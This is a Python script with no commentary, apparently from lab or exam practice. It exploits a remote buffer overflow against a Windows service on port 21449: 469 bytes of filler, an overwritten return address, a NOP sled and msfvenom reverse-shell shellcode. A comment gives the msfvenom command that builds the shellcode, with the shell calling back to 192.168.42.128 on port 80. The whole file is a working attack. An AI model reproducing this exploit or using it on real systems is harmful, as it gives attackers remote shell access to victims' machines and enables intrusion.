import socket
from struct import pack


def exploit():

    #badchars = 0x00,0x0A,0x0D
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.42.128 LPORT=80 -f python -b '\x00\x0a\x0d'
    buf =  b""
    buf += b"\xd9\xee\xd9\x74\x24\xf4\xbd\x7a\x9f\x74\x7f\x58"
    buf += b"\x2b\xc9\xb1\x52\x83\xc0\x04\x31\x68\x13\x03\x12"
    buf += b"\x8c\x96\x8a\x1e\x5a\xd4\x75\xde\x9b\xb9\xfc\x3b"
    buf += b"\xaa\xf9\x9b\x48\x9d\xc9\xe8\x1c\x12\xa1\xbd\xb4"
    buf += b"\xa1\xc7\x69\xbb\x02\x6d\x4c\xf2\x93\xde\xac\x95"
    buf += b"\x17\x1d\xe1\x75\x29\xee\xf4\x74\x6e\x13\xf4\x24"
    buf += b"\x27\x5f\xab\xd8\x4c\x15\x70\x53\x1e\xbb\xf0\x80"
    buf += b"\xd7\xba\xd1\x17\x63\xe5\xf1\x96\xa0\x9d\xbb\x80"
    buf += b"\xa5\x98\x72\x3b\x1d\x56\x85\xed\x6f\x97\x2a\xd0"
    buf += b"\x5f\x6a\x32\x15\x67\x95\x41\x6f\x9b\x28\x52\xb4"
    buf += b"\xe1\xf6\xd7\x2e\x41\x7c\x4f\x8a\x73\x51\x16\x59"
    buf += b"\x7f\x1e\x5c\x05\x9c\xa1\xb1\x3e\x98\x2a\x34\x90"
    buf += b"\x28\x68\x13\x34\x70\x2a\x3a\x6d\xdc\x9d\x43\x6d"
    buf += b"\xbf\x42\xe6\xe6\x52\x96\x9b\xa5\x3a\x5b\x96\x55"
    buf += b"\xbb\xf3\xa1\x26\x89\x5c\x1a\xa0\xa1\x15\x84\x37"
    buf += b"\xc5\x0f\x70\xa7\x38\xb0\x81\xee\xfe\xe4\xd1\x98"
    buf += b"\xd7\x84\xb9\x58\xd7\x50\x6d\x08\x77\x0b\xce\xf8"
    buf += b"\x37\xfb\xa6\x12\xb8\x24\xd6\x1d\x12\x4d\x7d\xe4"
    buf += b"\xf5\x78\x88\xe8\xeb\x15\x8e\xf4\xf3\xb5\x07\x12"
    buf += b"\x99\x25\x4e\x8d\x36\xdf\xcb\x45\xa6\x20\xc6\x20"
    buf += b"\xe8\xab\xe5\xd5\xa7\x5b\x83\xc5\x50\xac\xde\xb7"
    buf += b"\xf7\xb3\xf4\xdf\x94\x26\x93\x1f\xd2\x5a\x0c\x48"
    buf += b"\xb3\xad\x45\x1c\x29\x97\xff\x02\xb0\x41\xc7\x86"
    buf += b"\x6f\xb2\xc6\x07\xfd\x8e\xec\x17\x3b\x0e\xa9\x43"
    buf += b"\x93\x59\x67\x3d\x55\x30\xc9\x97\x0f\xef\x83\x7f"
    buf += b"\xc9\xc3\x13\xf9\xd6\x09\xe2\xe5\x67\xe4\xb3\x1a"
    buf += b"\x47\x60\x34\x63\xb5\x10\xbb\xbe\x7d\x20\xf6\xe2"
    buf += b"\xd4\xa9\x5f\x77\x65\xb4\x5f\xa2\xaa\xc1\xe3\x46"
    buf += b"\x53\x36\xfb\x23\x56\x72\xbb\xd8\x2a\xeb\x2e\xde"
    buf += b"\x99\x0c\x7b"

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.42.138',21449))
    buffer = b'A' * 469
    eip = pack('<L',0x621014E3)
    nops = b'\x90' * 16
    s.send(buffer + eip + nops + buf)
    s.close()
